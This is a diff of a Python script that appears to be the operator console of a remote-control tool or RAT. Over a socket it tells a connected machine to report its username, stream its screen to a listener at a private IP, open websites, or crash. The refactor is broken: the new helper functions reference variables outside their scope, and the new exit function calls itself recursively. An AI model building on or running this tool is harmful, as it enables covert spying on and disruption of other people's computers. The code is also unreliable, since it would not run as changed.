@@ -31,31 +31,39 @@ def main():
         print("[+] Connected")
         while True:
             command = input(str("Command >> "))
-            if command == "print":
-                conn.send(command.encode())
-                print("Command sent")
-            elif command == "exit":
-                conn.send(command.encode())
+            if command == "exit":
                 exit()
             elif command == "username":
-                conn.send(command.encode())
-                newuser = conn.recv(1024)
-                print(newuser.decode())
+                username()
             elif command == "screenshare":
-                conn.send(command.encode())
-                sock.close()
-                conn.close()
-                receiver = StreamingServer("192.168.178.59", 8080)
-                t = threading.Thread(target=receiver.start_server)
-                t.start()
-                while input(" >> ") != "exit":
-                    continue
-                receiver.stop_server()
+                screenshare()
             elif command == "website":
-                conn.send(command.encode())
-                website = input("Website >> ")
-                conn.send(website.encode())
+                website()
             elif command == "crash":
-                conn.send(command.encode())
+                crash()
         conn.close()
+
+def exit():
+    conn.send(command.encode())
+    exit()
+def username():
+    conn.send(command.encode())
+    newuser = conn.recv(1024)
+    print(newuser.decode())
+def screenshare():
+    conn.send(command.encode())
+    sock.close()
+    conn.close()
+    receiver = StreamingServer("192.168.178.59", 8080)
+    t = threading.Thread(target=receiver.start_server)
+    t.start()
+    while input(" >> ") != "exit":
+        continue
+    receiver.stop_server()
+def website():
+    conn.send(command.encode())
+    website = input("Website >> ")
+    conn.send(website.encode())
+def crash():
+    conn.send(command.encode())
 main()
